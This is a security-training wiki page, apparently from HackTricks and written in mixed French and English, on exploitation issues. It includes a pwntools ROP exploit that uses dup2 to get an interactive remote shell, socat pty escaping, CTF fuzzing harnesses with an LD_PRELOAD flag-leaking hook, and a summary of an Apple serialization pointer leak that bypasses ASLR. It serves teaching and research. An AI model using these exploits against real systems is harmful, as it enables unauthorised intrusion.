# Problèmes courants d'exploitation

{{#include ../banners/hacktricks-training.md}}

## FDs dans l'exploitation à distance

When sending an exploit to a remote server that calls **`system('/bin/sh')`** for example, this will be executed in the server process ofc, and `/bin/sh` will expect input from stdin (FD: `0`) and will print the output in stdout and stderr (FDs `1` and `2`). So the attacker won't be able to interact with the shell.

A way to fix this is to suppose that when the server started it created the **FD number `3`** (for listening) and that then, your connection is going to be in the **FD number `4`**. Therefore, it's possible to use the syscall **`dup2`** to duplicate the stdin (FD 0) and the stdout (FD 1) in the FD 4 (the one of the connection of the attacker) so it'll make feasible to contact the shell once it's executed.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Notez que socat transfère déjà **`stdin`** et **`stdout`** vers le socket. Cependant, le mode `pty` **inclut des caractères DELETE**. Donc, si vous envoyez un `\x7f` (`DELETE`), cela **supprimera le caractère précédent** de votre exploit.

Pour contourner cela, le **caractère d'échappement `\x16` doit être préfixé à tout `\x7f` envoyé.**

**Here you can** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

When an Android app ships only a stripped AArch64 `.so`, you can still fuzz exported logic directly on-device without rebuilding the APK. A practical workflow:

1. **Localisez les points d'entrée appelables.** `objdump -T libvalidate.so | grep -E "validate"` liste rapidement les fonctions exportées. Des décompilateurs (Ghidra, IDA, BN) révèlent la signature réelle, par ex. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Écrivez un harness autonome.** Chargez un fichier, gardez le buffer en vie et appelez le symbole exporté exactement comme le ferait l'app. Cross-compilez avec le NDK (e.g. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Minimal file-driven harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Reconstruire la structure attendue.** Les messages d'erreur et les comparaisons dans Ghidra ont montré que la fonction analysait du JSON strict avec des clés constantes (`magic`, `version`, nested `root.children.*`) et des vérifications arithmétiques (par ex., `value * 2 == 84` ⇒ `value` doit être `42`). Fournir du JSON syntaxiquement valide qui satisfait progressivement chaque branche permet de cartographier le schéma sans instrumentation.
4. **Contourner l'anti-debug pour leak des secrets.** Parce que la `.so` importe `snprintf`, le remplacer via `LD_PRELOAD` permet de dump les chaînes de format sensibles même lorsque les breakpoints sont bloqués :

<details>
<summary>Minimal snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltre le flag interne et confirme le crash oracle sans patcher le binaire.
5. **Shrink the fuzz space.** Le désassemblage a mis en évidence une clé XOR réutilisée pour la comparaison du flag, ce qui signifie que les sept premiers octets de `flag` étaient connus. Ne fuzz que les neuf octets inconnus.
6. **Embed fuzz bytes inside a valid JSON envelope.** Le AFL harness lit exactement neuf octets depuis `stdin`, les copie dans le suffixe du flag, et code en dur tous les autres champs (constantes, profondeurs d'arbre, préimage arithmétique). Toute lecture malformée provoque simplement une sortie, donc AFL consacre ses cycles à des cas de test pertinents :

<details>
<summary>Minimal AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** Any input that satisfies every semantic check and guesses the correct nine-byte suffix triggers the deliberate crash; those files land in `output/crashes` and can be replayed through the simple harness to recover the secret.

This workflow lets you triage anti-debug-protected JNI validators quickly, leak secrets when needed, then fuzz only the meaningful bytes, all without touching the original APK.

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### Requirements & attack surface

- A service accepts attacker-controlled property lists (XML or binary) and calls `NSKeyedUnarchiver.unarchivedObjectOfClasses` with a permissive allowlist (e.g., `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`).
- The resulting objects are reused and later serialized again with `NSKeyedArchiver` (or iterated in deterministic bucket order) and sent back to the attacker.
- Some key type in the containers uses pointer values as its hash code. Before March 2025, `CFNull`/`NSNull` fell back to `CFHash(object) == (uintptr_t)object`, and deserialization always returned the shared-cache singleton `kCFNull`, giving a stable kernel-shared pointer without memory corruption or timing.

### Controllable hashing primitives

- **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` lacks a hash callback, so `CFBasicHash` uses the object address as the hash. Because the singleton lives at a fixed shared-cache address until reboot, its hash is stable across processes.
- **Attacker-controlled hashes:** 32-bit `NSNumber` keys are hashed through `_CFHashInt`, which is deterministic and attacker-controllable. Picking specific integers lets the attacker choose `hash(number) % num_buckets` for any table size.
- **`NSDictionary` implementation:** Immutable dictionaries embed a `CFBasicHash` with a prime bucket count chosen from `__CFBasicHashTableSizes` (e.g., 23, 41, 71, 127, 191, 251, 383, 631, 1087). Collisions are handled with linear probing (`__kCFBasicHashLinearHashingValue`), and serialization walks buckets in numeric order; therefore, the order of serialized keys encodes the bucket index that each key finally occupied.

### Encoding bucket indices into serialization order

By crafting a plist that materializes a dictionary whose buckets alternate between occupied and empty slots, the attacker constrains where linear probing can place `NSNull`. For a 7-bucket example, filling even buckets with `NSNumber` keys produces:
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
During deserialization the victim inserts the single `NSNull` key. Its initial bucket is `hash(NSNull) % 7`, but probing advances until hitting one of the open indices {1,3,5}. The serialized key order reveals which slot was used, disclosing whether the pointer hash modulo 7 lies in {6,0,1}, {2,3}, or {4,5}. Because the attacker controls the original serialized order, the `NSNull` key is emitted last in the input plist so the post-reserialization ordering is solely a function of bucket placement.

### Déterminer les résidus exacts avec des tables complémentaires

Un seul dictionnaire ne leaks qu'un intervalle de résidus. Pour déterminer la valeur précise de `hash(NSNull) % p`, construisez **deux** dictionnaires par taille de bucket premier `p` : un avec les buckets pairs pré-remplis et un avec les buckets impairs pré-remplis. Pour le pattern complémentaire (`_ # _ # _ # _`), les emplacements vides (0,2,4,6) correspondent aux ensembles de résidus {0}, {1,2}, {3,4}, {5,6}. Observer la position sérialisée de `NSNull` dans les deux dictionnaires restreint le résidu à une seule valeur parce que l'intersection des deux ensembles candidats donne un `r_i` unique pour ce `p`.

L'attaquant regroupe tous les dictionnaires dans un `NSArray`, donc un seul aller-retour deserialize → serialize leaks les résidus pour chaque taille de table choisie.

### Reconstruction du pointeur shared-cache 64 bits

Pour chaque premier `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}`, l'attaquant récupère `hash(NSNull) ≡ r_i (mod p_i)` à partir de l'ordre sérialisé. L'application du théorème des restes chinois (CRT) avec l'algorithme d'Euclide étendu donne :
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
donc le résidu combiné équivaut de manière unique au pointeur 64 bits vers `kCFNull`. Le PoC Project Zero combine itérativement des congruences tout en affichant les modules intermédiaires pour montrer la convergence vers l'adresse réelle (`0x00000001eb91ab60` sur la build vulnérable).

### Practical workflow

1. **Generate crafted input:** Build the attacker-side XML plist (two dictionaries per prime, `NSNull` serialized last) and convert it to binary format.
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **Victim round trip:** The victim service deserializes with `NSKeyedUnarchiver.unarchivedObjectOfClasses` using the allowed classes set `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` and immediately re-serializes with `NSKeyedArchiver`.
3. **Residue extraction:** Converting the returned plist back to XML reveals the dictionary key ordering. A helper such as `extract-pointer.c` reads the object table, determines the index of the singleton `NSNull`, maps each dictionary pair back to its bucket residue, and solves the CRT system to recover the shared-cache pointer.
4. **Verification (optional):** Compiling a tiny Objective-C helper that prints `CFHash(kCFNull)` confirms the leaked value matches the real address.

No memory safety bug is required—simply observing serialization order of pointer-keyed structures yields a remote ASLR bypass primitive.

## Related pages

{{#ref}}
common-exploiting-problems-unsafe-relocation-fixups.md
{{#endref}}

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## References

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
